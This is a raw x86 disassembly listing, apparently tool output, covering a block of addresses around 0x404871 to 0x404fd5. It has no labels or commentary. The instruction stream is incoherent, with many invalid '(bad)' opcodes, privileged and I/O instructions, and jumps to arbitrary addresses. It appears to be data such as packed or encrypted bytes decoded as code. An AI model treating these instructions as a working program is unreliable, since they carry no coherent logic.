  404871:	or     DWORD PTR [ebp+0x78cf2ec4],esi
  404877:	or     dh,BYTE PTR [edi+0x786b002c]
  40487d:	lods   al,BYTE PTR ds:[esi]
  40487e:	loopne 0x404898
  404880:	scas   eax,DWORD PTR es:[edi]
  404881:	mov    ds:0xaed0db9d,al
  404886:	or     BYTE PTR [ecx-0x78],dh
  404889:	(bad)  
  40488a:	jo     0x404817
  40488c:	ins    DWORD PTR es:[edi],dx
  40488d:	push   ss
  40488e:	adc    al,0xb1
  404890:	jbe    0x40486d
  404892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404893:	sbb    DWORD PTR [ebx],0x3a
  404896:	sub    ecx,DWORD PTR [ecx+0x56]
  404899:	mov    cs,esp
  40489b:	xchg   edx,eax
  40489c:	ds push edx
  40489e:	loope  0x4048d0
  4048a0:	xor    DWORD PTR [edi+0x69930aff],0x6008b5a1
  4048aa:	pop    edx
  4048ab:	in     eax,dx
  4048ac:	sti    
  4048ad:	jg     0x4048fd
  4048af:	pushf  
  4048b0:	push   ebx
  4048b1:	add    DWORD PTR [ecx],eax
  4048b3:	fwait
  4048b4:	inc    ebp
  4048b5:	pop    ebp
  4048b6:	outs   dx,BYTE PTR ds:[esi]
  4048b7:	or     edi,edx
  4048b9:	mov    al,0xbb
  4048bb:	imul   eax,DWORD PTR [esi-0x5d],0x57dc5789
  4048c2:	jne    0x40490b
  4048c4:	xchg   esi,eax
  4048c5:	fdiv   st,st(1)
  4048c7:	pop    edx
  4048c8:	jecxz  0x40492c
  4048ca:	lods   eax,DWORD PTR ds:[esi]
  4048cb:	pop    edx
  4048cc:	dec    eax
  4048cd:	and    al,BYTE PTR [ebx+0x54eb38a5]
  4048d3:	dec    esp
  4048d4:	jp     0x404896
  4048d6:	fs pop ebx
  4048d8:	jecxz  0x4048bb
  4048da:	jg     0x4048b6
  4048dc:	push   esi
  4048dd:	jno    0x404908
  4048df:	clc    
  4048e0:	add    eax,0xc455e261
  4048e5:	stos   DWORD PTR es:[edi],eax
  4048e6:	xor    dl,BYTE PTR [esi+edx*4]
  4048e9:	mov    ds:0xc6e3618b,al
  4048ee:	adc    edx,DWORD PTR [edi+ebx*2]
  4048f1:	ret    
  4048f2:	stos   DWORD PTR es:[edi],eax
  4048f3:	pop    eax
  4048f4:	xchg   ebp,ebx
  4048f6:	adc    BYTE PTR [edx-0x6e],0x96
  4048fa:	ins    BYTE PTR es:[edi],dx
  4048fb:	dec    ebp
  4048fc:	dec    eax
  4048fd:	and    al,0x33
  4048ff:	in     eax,dx
  404900:	mov    dh,0xe4
  404902:	jmp    0x40491d
  404904:	dec    esp
  404905:	inc    ebx
  404906:	retf   0x505d
  404909:	ds adc ch,dl
  40490c:	mov    gs,WORD PTR [ebx+0x40b2831e]
  404912:	pop    eax
  404913:	dec    esi
  404914:	inc    edx
  404915:	sub    ch,ah
  404917:	adc    BYTE PTR [edx-0x2c],cl
  40491a:	gs and eax,0xaf1dd737
  404920:	in     al,0xf5
  404922:	adc    DWORD PTR [edx+0x6de17fe3],edi
  404928:	push   cs
  404929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40492a:	bound  ebp,QWORD PTR [eax+0x563c53aa]
  404930:	sub    DWORD PTR [ecx],ebx
  404932:	or     al,0x1a
  404934:	dec    edi
  404935:	nop
  404936:	daa    
  404937:	jbe    0x404909
  404939:	jge    0x4048df
  40493b:	pop    ss
  40493c:	shr    DWORD PTR [edx+edx*8+0x39],cl
  404940:	cmp    eax,0xdea318eb
  404945:	xchg   ebx,eax
  404946:	jne    0x40494a
  404948:	repnz imul ecx,eax,0xffffffe5
  40494c:	sahf   
  40494d:	push   es
  40494e:	outs   dx,BYTE PTR ds:[esi]
  40494f:	int3   
  404950:	xchg   edx,eax
  404951:	ds sbb bl,bl
  404954:	sti    
  404955:	jbe    0x4049ce
  404957:	aad    0xec
  404959:	or     ecx,edi
  40495b:	jnp    0x404943
  40495d:	fs xchg edx,eax
  40495f:	jae    0x40491e
  404961:	ret    
  404962:	fs cmp ch,dh
  404965:	repz xor BYTE PTR ds:0x1e645a7,cl
  40496c:	icebp  
  40496d:	in     al,0x3f
  40496f:	mov    ah,0x24
  404971:	sub    esi,0x69ab0b1c
  404977:	and    BYTE PTR [edi+0x28200c34],0xbb
  40497e:	stc    
  40497f:	repz iret 
  404981:	out    dx,al
  404982:	iret   
  404983:	lea    ecx,[edi]
  404985:	xchg   ebp,eax
  404986:	and    BYTE PTR [edx],0xb
  404989:	mov    al,0xd9
  40498b:	jmp    0x7f0ab34a
  404990:	out    dx,eax
  404991:	icebp  
  404992:	in     al,0xc4
  404994:	push   edi
  404995:	mov    WORD PTR [ecx+0x41ec8f07],fs
  40499b:	out    dx,eax
  40499c:	jb     0x40494e
  40499e:	fild   QWORD PTR [edi+eiz*8-0x6c08ae4]
  4049a5:	jge    0x404987
  4049a7:	in     eax,0x9e
  4049a9:	sbb    BYTE PTR [esi],al
  4049ab:	pop    edx
  4049ac:	cwde   
  4049ad:	jg     0x404a09
  4049af:	aam    0xb6
  4049b1:	fsub   st(2),st
  4049b3:	iret   
  4049b4:	fwait
  4049b5:	in     al,0x98
  4049b7:	imul   ebp,esp,0xffffffe9
  4049ba:	sbb    eax,0x3599fd2d
  4049bf:	sti    
  4049c0:	push   ss
  4049c1:	mov    ch,0xbb
  4049c3:	mov    ah,0x91
  4049c5:	jp     0x404a2b
  4049c7:	es xchg ebp,eax
  4049c9:	inc    eax
  4049ca:	pop    edi
  4049cb:	call   0xf8828295
  4049d0:	in     al,dx
  4049d1:	mov    eax,ds:0x9aec6f74
  4049d6:	pop    ecx
  4049d7:	repz cld 
  4049d9:	add    al,0xd6
  4049db:	or     al,0x40
  4049dd:	mov    ch,BYTE PTR [ebx+0x34]
  4049e0:	in     eax,dx
  4049e1:	sahf   
  4049e2:	and    ebp,DWORD PTR [edx-0x31c1cc03]
  4049e8:	clc    
  4049e9:	or     cl,BYTE PTR [esi-0x56]
  4049ec:	mov    ds:0x62aed312,eax
  4049f1:	xor    DWORD PTR [ecx+0x2c],ecx
  4049f4:	xchg   ebx,eax
  4049f5:	pop    ds
  4049f6:	test   DWORD PTR [esi-0x36e233b8],esi
  4049fc:	mov    bh,0xdc
  4049fe:	cmp    eax,0xa094ae61
  404a03:	mov    esi,0x9cb792b0
  404a08:	addr16 jmp 0x4049fd
  404a0b:	pop    eax
  404a0c:	pop    es
  404a0d:	sub    eax,0xa60da231
  404a12:	and    dh,BYTE PTR [ebx-0x30]
  404a15:	out    dx,al
  404a16:	sub    bh,bl
  404a18:	lea    edi,[ebp-0x7c]
  404a1b:	pop    ebx
  404a1c:	jg     0x404a27
  404a1e:	inc    edx
  404a1f:	inc    esi
  404a20:	je     0x4049d5
  404a22:	fld    DWORD PTR [ebp-0xc]
  404a25:	xor    ebx,DWORD PTR [eax+0x43]
  404a28:	jg     0x4049e0
  404a2a:	jp     0x4049b8
  404a2c:	xchg   ebp,eax
  404a2d:	adc    edi,esi
  404a2f:	or     BYTE PTR [edx],ch
  404a31:	lods   eax,DWORD PTR ds:[esi]
  404a32:	mov    al,0xa4
  404a34:	jg     0x404a69
  404a36:	jbe    0x404a27
  404a38:	jae    0x404aaa
  404a3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a3b:	inc    edi
  404a3c:	jecxz  0x404aab
  404a3e:	add    al,0x2c
  404a40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a41:	or     eax,0x57a4c0d8
  404a46:	xchg   esi,eax
  404a47:	je     0x404a32
  404a49:	xlat   BYTE PTR ds:[ebx]
  404a4a:	popa   
  404a4b:	mov    ds:0x9cf299d1,eax
  404a50:	imul   esi,DWORD PTR [ebx+0x6c],0x6025e735
  404a57:	aaa    
  404a58:	jne    0x404a11
  404a5a:	aas    
  404a5b:	sbb    eax,0xed4ad017
  404a60:	cmp    BYTE PTR [ebp-0x200d8bcf],0xf0
  404a67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a68:	adc    cl,bh
  404a6a:	mov    ch,0x6c
  404a6c:	and    DWORD PTR [ebx+ecx*1+0x24],edx
  404a70:	cmp    al,0xda
  404a72:	fsubr  st,st(5)
  404a74:	call   0xb8f67b9c
  404a79:	enter  0x2c84,0x7d
  404a7d:	or     DWORD PTR [ebx],ebx
  404a7f:	jbe    0x404a30
  404a81:	pop    ebx
  404a82:	mov    ebp,0x71db79bb
  404a87:	iret   
  404a88:	pushf  
  404a89:	jnp    0x404ada
  404a8b:	cs iret 
  404a8d:	mov    esp,0xbfb9bf3f
  404a92:	sub    DWORD PTR [esi+0x55],edi
  404a95:	jae    0x404ac8
  404a97:	(bad)  
  404a98:	dec    esp
  404a99:	jle    0x404af7
  404a9b:	jl     0x404a72
  404a9d:	xchg   DWORD PTR [ebx+0x42867ab6],ebx
  404aa3:	add    bh,BYTE PTR [ebx]
  404aa5:	sbb    dh,BYTE PTR [esi]
  404aa7:	fimul  WORD PTR [edx-0x42ffac75]
  404aad:	cmc    
  404aae:	dec    eax
  404aaf:	test   BYTE PTR [esi-0x16abb2b6],ch
  404ab5:	arpl   WORD PTR [ecx],di
  404ab7:	les    esp,FWORD PTR [ecx]
  404ab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404aba:	test   eax,0xa6136817
  404abf:	and    esi,DWORD PTR [ecx+0x64]
  404ac2:	pop    ecx
  404ac3:	cmp    ebx,DWORD PTR [edx+0x31]
  404ac6:	ror    DWORD PTR [ebx+eiz*8-0xe],1
  404aca:	push   0xb69ceb21
  404acf:	and    DWORD PTR [esp+eax*2+0x33],edi
  404ad3:	pusha  
  404ad4:	(bad)  
  404ad5:	std    
  404ad6:	cmp    DWORD PTR [edx-0x68],edi
  404ad9:	mov    ebp,0xefbff538
  404ade:	and    DWORD PTR [ebx-0x3d],edx
  404ae1:	mov    dh,0x0
  404ae3:	mov    dl,0x55
  404ae5:	fisubr WORD PTR [ebp-0x31]
  404ae8:	jmp    0x68c3:0xc56e3c31
  404aef:	jno    0x404ab8
  404af1:	xchg   ecx,eax
  404af2:	push   0x8175e559
  404af7:	fstp   QWORD PTR [esi+0x7d]
  404afa:	fdiv   QWORD PTR [ebp+ecx*1+0x63]
  404afe:	pop    esi
  404aff:	adc    eax,0x19c2913c
  404b04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b05:	fcmovb st,st(4)
  404b07:	adc    eax,0x6cdd5412
  404b0c:	std    
  404b0d:	lds    ecx,FWORD PTR [edx]
  404b0f:	inc    edi
  404b10:	bnd jnp 0x404b8f
  404b13:	shl    DWORD PTR [ecx],0x1a
  404b16:	pop    ss
  404b17:	scas   eax,DWORD PTR es:[edi]
  404b18:	fistp  QWORD PTR [ecx-0x1ef6ffd2]
  404b1e:	in     al,0xe8
  404b20:	inc    esi
  404b21:	mov    ecx,0xc54ae6a0
  404b26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b27:	dec    ebp
  404b28:	rol    BYTE PTR [esi-0x61b37cd1],0x35
  404b2f:	mov    ch,0x55
  404b31:	pop    ecx
  404b32:	xor    BYTE PTR [edx-0x5e],cl
  404b35:	or     cl,BYTE PTR [ecx-0xc]
  404b38:	in     eax,dx
  404b39:	mov    ebp,0xe26bf429
  404b3e:	repnz shr BYTE PTR [edx+0x7bbecd94],1
  404b45:	xor    ebx,edx
  404b47:	cmp    ecx,DWORD PTR ds:0x29de54e9
  404b4d:	das    
  404b4e:	add    bl,BYTE PTR [ecx+0x6c4ffd02]
  404b54:	sub    BYTE PTR [eax],0x62
  404b57:	idiv   BYTE PTR [ecx+eiz*1-0x6f]
  404b5b:	(bad)  
  404b5c:	lldt   WORD PTR [ebp+0x37]
  404b60:	push   edx
  404b61:	cmp    bl,BYTE PTR [esi]
  404b63:	sbb    bl,ch
  404b65:	or     eax,0xe0c7959c
  404b6a:	mov    cl,0xa2
  404b6c:	xor    DWORD PTR ds:0x7fddf601,ebp
  404b72:	call   0x7a5fa8e
  404b77:	mov    esi,0xaf36ed23
  404b7c:	sub    al,0x57
  404b7e:	adc    al,0xf9
  404b80:	daa    
  404b81:	and    bl,0x6f
  404b84:	or     dl,dh
  404b86:	cmp    al,0xad
  404b88:	inc    edx
  404b89:	retf   0xf7f0
  404b8c:	enterw 0x26e2,0x1f
  404b91:	scas   al,BYTE PTR es:[edi]
  404b92:	mov    ds:0x9e384a06,al
  404b97:	add    eax,0xed631170
  404b9c:	cmp    eax,0x82c69f0c
  404ba1:	loope  0x404b6c
  404ba3:	stos   DWORD PTR es:[edi],eax
  404ba4:	pushf  
  404ba5:	add    eax,0xe4683d3b
  404baa:	mov    bh,0x32
  404bac:	nop
  404bad:	jle    0x404bda
  404baf:	(bad)  
  404bb0:	cli    
  404bb1:	stos   DWORD PTR es:[edi],eax
  404bb2:	xchg   esi,eax
  404bb3:	or     DWORD PTR [eax+ecx*4-0x6e],ebx
  404bb7:	inc    eax
  404bb8:	stc    
  404bb9:	sahf   
  404bba:	pop    es
  404bbb:	push   cs
  404bbc:	inc    di
  404bbe:	pop    ss
  404bbf:	fnsetpm(287 only) 
  404bc1:	sbb    bl,BYTE PTR [edi]
  404bc3:	(bad)  
  404bc4:	dec    esp
  404bc5:	sar    bl,1
  404bc7:	and    dh,BYTE PTR [edi+0x764686cc]
  404bcd:	sti    
  404bce:	iret   
  404bcf:	cld    
  404bd0:	push   0x79
  404bd2:	les    edx,FWORD PTR [edi+0x6]
  404bd5:	ret    
  404bd6:	jp     0x404ba4
  404bd8:	and    ah,ch
  404bda:	(bad)  
  404bdb:	push   esp
  404bdc:	rcl    DWORD PTR [eax+0xb21f5d5],cl
  404be2:	icebp  
  404be3:	std    
  404be4:	aaa    
  404be5:	xor    BYTE PTR [edx],cl
  404be7:	or     eax,DWORD PTR [edi+0x1447dac9]
  404bed:	xchg   ecx,eax
  404bee:	repnz mov BYTE PTR [ecx-0x5d],cl
  404bf2:	ins    BYTE PTR es:[edi],dx
  404bf3:	push   edi
  404bf4:	xchg   ebx,eax
  404bf5:	and    al,0x6d
  404bf7:	mov    eax,0x5f8ad8e7
  404bfc:	imul   ebp,esi,0xffffffbd
  404bff:	scas   al,BYTE PTR es:[edi]
  404c00:	cmp    eax,0xe5a114ca
  404c05:	lods   al,BYTE PTR ds:[esi]
  404c06:	mov    esp,0xc082e8ba
  404c0b:	pop    edx
  404c0c:	fs test eax,0x32400893
  404c12:	sub    bh,dl
  404c14:	jl     0x404bf7
  404c16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c17:	sbb    al,0xf
  404c19:	shr    DWORD PTR [eax-0x3b],1
  404c1c:	add    ebx,DWORD PTR [edi]
  404c1e:	dec    ebx
  404c1f:	popf   
  404c20:	repnz add cl,cl
  404c23:	pop    edx
  404c24:	push   0xf2445167
  404c29:	int3   
  404c2a:	mov    WORD PTR [ecx+edx*8],ds
  404c2d:	mov    bh,al
  404c2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c30:	jl     0x404c63
  404c32:	push   ebp
  404c33:	and    DWORD PTR [eax+0x7e5a9e6a],esp
  404c39:	inc    ebx
  404c3a:	lds    edx,FWORD PTR [eax+0x7b]
  404c3d:	fisubr DWORD PTR [ebp+ebx*1-0x3]
  404c41:	mov    esi,0xa11538fb
  404c46:	pop    ebp
  404c47:	(bad)  
  404c48:	lahf   
  404c49:	pushf  
  404c4a:	enter  0x858b,0x58
  404c4e:	data16 jmp 0x404c4f
  404c51:	test   BYTE PTR [eax],bl
  404c53:	dec    esp
  404c54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c55:	jecxz  0x404c32
  404c57:	dec    ebp
  404c58:	aas    
  404c59:	inc    eax
  404c5a:	mov    ecx,0x7fc9175c
  404c5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c60:	xchg   ebp,eax
  404c61:	mov    cl,0xe0
  404c63:	or     al,0x6e
  404c65:	mov    eax,ds:0xf0404c5e
  404c6a:	js     0x404c9d
  404c6c:	inc    esp
  404c6d:	daa    
  404c6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c6f:	dec    ebx
  404c70:	jle    0x404c42
  404c72:	jb     0x404c5e
  404c74:	dec    edi
  404c75:	cmp    al,0x16
  404c77:	dec    ecx
  404c78:	dec    ecx
  404c79:	xchg   ecx,eax
  404c7a:	jae    0x404c0e
  404c7c:	pusha  
  404c7d:	push   esp
  404c7e:	adc    eax,0x25d4a3cd
  404c83:	push   ds
  404c84:	(bad)  
  404c85:	iret   
  404c86:	xchg   esp,eax
  404c87:	inc    ebx
  404c88:	lock or eax,0xa0494bd4
  404c8e:	fimul  WORD PTR [edi-0x533d3c18]
  404c94:	clc    
  404c95:	and    ch,dh
  404c97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c98:	push   cs
  404c99:	into   
  404c9a:	clc    
  404c9b:	sub    bh,BYTE PTR [ebx+edx*1+0x6d]
  404c9f:	popa   
  404ca0:	mov    BYTE PTR [edi+0x341d4faa],dl
  404ca6:	fs xchg ebp,eax
  404ca8:	and    BYTE PTR [ecx],bh
  404caa:	mov    ?,ebp
  404cac:	adc    al,0xd0
  404cae:	retf   0x24fa
  404cb1:	push   esp
  404cb2:	or     ebp,DWORD PTR [eax-0x5e]
  404cb5:	mov    dh,0x8a
  404cb7:	pop    ds
  404cb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cb9:	fimul  WORD PTR [edx]
  404cbb:	inc    ecx
  404cbc:	call   0xf394ced2
  404cc1:	mov    dl,0x79
  404cc3:	cld    
  404cc4:	dec    esi
  404cc5:	out    0x7f,eax
  404cc7:	adc    bl,ch
  404cc9:	fs dec edx
  404ccb:	inc    esp
  404ccc:	(bad)  
  404ccd:	push   ss
  404cce:	and    eax,0x4d3c5693
  404cd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cd4:	aas    
  404cd5:	xor    DWORD PTR ds:0x76a2a5cf,ebx
  404cdb:	sub    eax,0x554cf20d
  404ce0:	add    BYTE PTR [ebx],0x5
  404ce3:	xchg   ebp,eax
  404ce4:	inc    esi
  404ce5:	ror    bl,1
  404ce7:	jno    0x404d1c
  404ce9:	(bad)  
  404cea:	repz mov ebx,0x894f1dd0
  404cf0:	jae    0x404d47
  404cf2:	int    0x20
  404cf4:	sub    BYTE PTR [edi],0x40
  404cf7:	in     al,dx
  404cf8:	and    DWORD PTR [esi-0x1cd9e674],esp
  404cfe:	aaa    
  404cff:	fbstp  TBYTE PTR [ecx]
  404d01:	mov    al,ds:0xe8af7d39
  404d06:	xchg   esp,eax
  404d07:	xchg   esi,eax
  404d08:	jge    0x404cc2
  404d0a:	clc    
  404d0b:	pushf  
  404d0c:	cmc    
  404d0d:	adc    BYTE PTR [ebp+edx*4-0x4aa73a31],cl
  404d14:	cs xor al,0xca
  404d17:	lods   al,BYTE PTR ds:[esi]
  404d18:	dec    edx
  404d19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d1a:	jae    0x404d16
  404d1c:	ret    0xea9b
  404d1f:	jg     0x404d96
  404d21:	daa    
  404d22:	jmp    0xc84b:0xd482c7d1
  404d29:	jg     0x404da2
  404d2b:	sahf   
  404d2c:	out    0x58,eax
  404d2e:	dec    ebp
  404d2f:	mov    eax,0x4121634f
  404d34:	sbb    eax,0xfb62826f
  404d39:	xchg   esp,eax
  404d3a:	icebp  
  404d3b:	pushf  
  404d3c:	addr16 inc esi
  404d3e:	sub    edx,ecx
  404d40:	sbb    eax,0xa42b32d9
  404d45:	in     al,0xc3
  404d47:	mov    eax,0x344da496
  404d4c:	mov    eax,ds:0xffe5b94c
  404d51:	cli    
  404d52:	mov    WORD PTR [ebx+0x14b18d71],es
  404d58:	cmc    
  404d59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d5a:	cmp    dh,dh
  404d5c:	and    ah,BYTE PTR [esi]
  404d5e:	adc    eax,0x35a1b6a2
  404d63:	stc    
  404d64:	pop    ss
  404d65:	add    DWORD PTR [ebp-0x2a9d56b5],0x9ca7be03
  404d6f:	push   ebp
  404d70:	jmp    0x62dc40a8
  404d75:	call   0x3a0b:0x1ac4479d
  404d7c:	push   edi
  404d7d:	xchg   ebp,eax
  404d7e:	mov    eax,ds:0x6c0b156
  404d83:	pop    esp
  404d84:	sbb    BYTE PTR [eax+0x6d],dh
  404d87:	adc    edx,DWORD PTR [ecx-0x4]
  404d8a:	sbb    DWORD PTR [ebx],ebx
  404d8c:	cmp    eax,0xbbc1a1cb
  404d91:	repz pop ecx
  404d93:	push   cs
  404d94:	add    DWORD PTR [edi+0x12],ebp
  404d97:	inc    ecx
  404d98:	jae    0x404dee
  404d9a:	js     0x404dcf
  404d9c:	add    cl,BYTE PTR [eax]
  404d9e:	aas    
  404d9f:	and    al,0x80
  404da1:	xor    esi,DWORD PTR [edx-0x1d]
  404da4:	jbe    0x404d67
  404da6:	loope  0x404da2
  404da8:	adc    al,0xa6
  404daa:	(bad)  
  404dab:	cmc    
  404dac:	sar    DWORD PTR [ebp+0x2773642b],0x22
  404db3:	dec    ebp
  404db4:	jl     0x404d55
  404db6:	rcr    DWORD PTR [ebp+0x6007b31e],0x3d
  404dbd:	clc    
  404dbe:	(bad)  
  404dbf:	icebp  
  404dc0:	rcl    BYTE PTR [ecx+0x30],cl
  404dc3:	loope  0x404e2a
  404dc5:	popf   
  404dc6:	push   ss
  404dc7:	stc    
  404dc8:	mov    eax,0x455a6ec8
  404dcd:	sahf   
  404dce:	pusha  
  404dcf:	sub    eax,0x62a9d804
  404dd4:	out    0x3,al
  404dd6:	pusha  
  404dd7:	xchg   edi,eax
  404dd8:	out    dx,al
  404dd9:	xor    edx,ecx
  404ddb:	and    edi,esi
  404ddd:	adc    edi,DWORD PTR ds:0x21a3959e
  404de3:	jno    0x404e1c
  404de5:	mov    dl,0xb3
  404de7:	xchg   ebp,eax
  404de8:	sti    
  404de9:	adc    eax,0x122dd322
  404dee:	pop    esp
  404def:	shl    DWORD PTR [esi-0x22536643],cl
  404df5:	pushf  
  404df6:	or     eax,0xacac7f94
  404dfb:	xchg   ecx,eax
  404dfc:	sbb    BYTE PTR gs:[edi+0x3f1144b1],ch
  404e03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e04:	sbb    ah,dl
  404e06:	data16 stos BYTE PTR es:[edi],al
  404e08:	sahf   
  404e09:	or     esi,DWORD PTR [ebp-0x33]
  404e0c:	push   0xc8c069c
  404e11:	and    DWORD PTR [eax+0x2558def2],ebp
  404e17:	fwait
  404e18:	out    dx,al
  404e19:	(bad)  
  404e1a:	aam    0x6
  404e1c:	outs   dx,DWORD PTR ds:[esi]
  404e1d:	sbb    al,0xfe
  404e1f:	adc    DWORD PTR [esi-0x60d84eb9],edi
  404e25:	int3   
  404e26:	add    eax,ecx
  404e28:	mov    ebp,ebx
  404e2a:	iret   
  404e2b:	jp     0x404e16
  404e2d:	dec    eax
  404e2e:	pop    edx
  404e2f:	aaa    
  404e30:	mov    cl,0xa8
  404e32:	and    DWORD PTR [edi-0x65],0x49
  404e36:	(bad)  
  404e38:	dec    ecx
  404e39:	outs   dx,BYTE PTR ds:[esi]
  404e3a:	pop    esi
  404e3b:	xchg   esp,eax
  404e3c:	jmp    0x5bb614c
  404e41:	xor    bl,dh
  404e43:	(bad)  
  404e44:	call   0xfbda0d60
  404e49:	mov    eax,0xdd7da90
  404e4e:	xchg   esp,eax
  404e4f:	fisubr DWORD PTR [esi+0x2b]
  404e52:	xor    edi,DWORD PTR [ecx+esi*4]
  404e55:	repnz push ds
  404e57:	pop    edx
  404e58:	fstp   DWORD PTR [esi]
  404e5a:	sbb    DWORD PTR [edi],ebx
  404e5c:	add    ebx,DWORD PTR [ebp+0x838f336]
  404e62:	sbb    BYTE PTR ds:0xf1bb7efb,bh
  404e68:	xchg   edi,eax
  404e69:	jnp    0x404e40
  404e6b:	xchg   esi,eax
  404e6c:	cmp    bl,ah
  404e6e:	xor    eax,0x6d5f46c2
  404e73:	int    0xd1
  404e75:	aas    
  404e76:	jmp    0xb5ffa9b1
  404e7b:	adc    edx,DWORD PTR [ecx+0x30]
  404e7e:	pushf  
  404e7f:	push   ss
  404e80:	loop   0x404e78
  404e82:	and    DWORD PTR [ebp-0x3880ef86],esi
  404e88:	and    edi,esi
  404e8a:	into   
  404e8b:	clc    
  404e8c:	scas   al,BYTE PTR es:[edi]
  404e8d:	lock fs inc esi
  404e90:	aam    0x18
  404e92:	out    dx,al
  404e93:	repnz es xor al,0x7b
  404e97:	xchg   ebx,eax
  404e98:	mov    ah,0xa2
  404e9a:	sbb    ecx,ebp
  404e9c:	test   BYTE PTR [ebp-0x21],bl
  404e9f:	xor    BYTE PTR [ebx-0x69],ah
  404ea2:	call   DWORD PTR [edx+0x6e]
  404ea5:	iret   
  404ea6:	xor    al,0x65
  404ea8:	retf   0xf5c1
  404eab:	stc    
  404eac:	add    BYTE PTR ds:0x8c02ed80,bl
  404eb2:	fldln2 
  404eb4:	and    ebx,edx
  404eb6:	sub    al,0xe9
  404eb8:	int    0x51
  404eba:	xchg   edx,eax
  404ebb:	pop    ebp
  404ebd:	iret   
  404ebe:	cdq    
  404ebf:	push   ecx
  404ec0:	je     0x404e76
  404ec2:	mov    bh,0xde
  404ec4:	and    eax,0x3cd07c4b
  404ec9:	xchg   esi,eax
  404eca:	jmp    0x16b7:0x15239a37
  404ed1:	ror    BYTE PTR [edi+0x1c],1
  404ed4:	dec    ebp
  404ed5:	mov    bh,0x7b
  404ed7:	push   ebx
  404ed8:	push   ebp
  404ed9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404edb:	mov    ebx,0x6f3b7c9c
  404ee0:	push   eax
  404ee1:	out    dx,eax
  404ee2:	pusha  
  404ee3:	cmp    al,0xdf
  404ee5:	pop    DWORD PTR [eax+0x6054708a]
  404eeb:	outs   dx,BYTE PTR ds:[esi]
  404eec:	cmc    
  404eed:	pusha  
  404eee:	retf   0xea4
  404ef1:	mov    ebx,0xe3754c16
  404ef6:	in     al,0x7d
  404ef8:	jbe    0x404ef9
  404efa:	xor    dl,BYTE PTR [esi]
  404efc:	(bad)  
  404efd:	jle    0x404f20
  404eff:	push   es
  404f00:	ror    DWORD PTR [edi+0x54],1
  404f03:	mov    WORD PTR [edi+0x1392cb16],fs
  404f09:	dec    edx
  404f0a:	pop    ebx
  404f0b:	ja     0x404f0c
  404f0d:	jle    0x404f54
  404f0f:	mov    bh,0x12
  404f11:	(bad)  
  404f12:	loope  0x404eb5
  404f14:	xor    ah,bh
  404f16:	cli    
  404f17:	mov    eax,0x6c9b1810
  404f1c:	push   ecx
  404f1d:	mov    cl,0x8
  404f1f:	imul   ecx,DWORD PTR [edx],0x16432d4e
  404f25:	mov    dh,0x67
  404f27:	nop
  404f28:	rol    BYTE PTR [ebp+0x224d5ce5],0x97
  404f2f:	pop    ebp
  404f30:	push   es
  404f31:	mov    bl,0x4c
  404f33:	fs fs mov ebp,0x7f35e098
  404f3a:	xlat   BYTE PTR ds:[ebx]
  404f3b:	mov    edx,0xaf16db0f
  404f40:	imul   ebp,esi,0xd85c1728
  404f46:	and    BYTE PTR [ecx+0x6d],ch
  404f49:	call   0x406c704b
  404f4e:	es pop edx
  404f50:	fs nop
  404f52:	push   edx
  404f53:	push   cs
  404f54:	hlt    
  404f55:	popaw  
  404f57:	push   0x1f
  404f59:	nop
  404f5a:	in     al,0xf1
  404f5c:	dec    ecx
  404f5d:	aaa    
  404f5e:	or     eax,0x37acf063
  404f63:	pop    ds
  404f64:	xor    DWORD PTR [edx],esp
  404f66:	in     eax,dx
  404f67:	(bad)  
  404f68:	int    0xdb
  404f6a:	mov    eax,0x3defef82
  404f6f:	dec    ebp
  404f70:	fwait
  404f71:	int    0x68
  404f73:	jg     0x404fcb
  404f75:	pop    ss
  404f76:	mov    esp,0x65a6ab22
  404f7b:	ins    DWORD PTR es:[edi],dx
  404f7c:	sub    bh,BYTE PTR [edx+0x5db2d52b]
  404f82:	aaa    
  404f83:	pop    ebx
  404f84:	mov    ah,0x82
  404f86:	mov    ch,0x4a
  404f88:	fadd   st,st(0)
  404f8a:	hlt    
  404f8b:	out    0xcd,eax
  404f8d:	xor    DWORD PTR [eax-0x7c84a5ed],0x2
  404f94:	fcom   DWORD PTR [edi-0x68]
  404f97:	xor    ch,BYTE PTR [eax-0x2ee028d3]
  404f9d:	cmc    
  404f9e:	out    dx,eax
  404f9f:	dec    eax
  404fa0:	xchg   BYTE PTR [esi+0x7009ff97],dh
  404fa6:	in     al,0x53
  404fa8:	pop    edx
  404fa9:	xor    DWORD PTR [eax-0x1334dd69],edx
  404faf:	push   cs
  404fb0:	dec    ebp
  404fb1:	pop    ss
  404fb2:	push   esi
  404fb3:	lods   eax,DWORD PTR ds:[esi]
  404fb4:	out    dx,al
  404fb5:	and    BYTE PTR [eax-0x1c],dh
  404fb8:	sahf   
  404fb9:	adc    ch,BYTE PTR [esi+0x4b4b7277]
  404fbf:	mov    edi,DWORD PTR [ecx+0x56]
  404fc2:	push   ss
  404fc3:	sbb    bl,BYTE PTR [ecx-0x1f]
  404fc6:	dec    edx
  404fc7:	or     cl,BYTE PTR [ebp+0x62]
  404fca:	adc    DWORD PTR [edx+0x2d],ecx
  404fcd:	mov    DWORD PTR [edx],ebx
  404fcf:	aam    0x1a
  404fd1:	push   eax
  404fd2:	mov    dl,0x69
  404fd4:	clc    
  404fd5:	adc    DWORD PTR [ecx+0x7b8127c8],edx
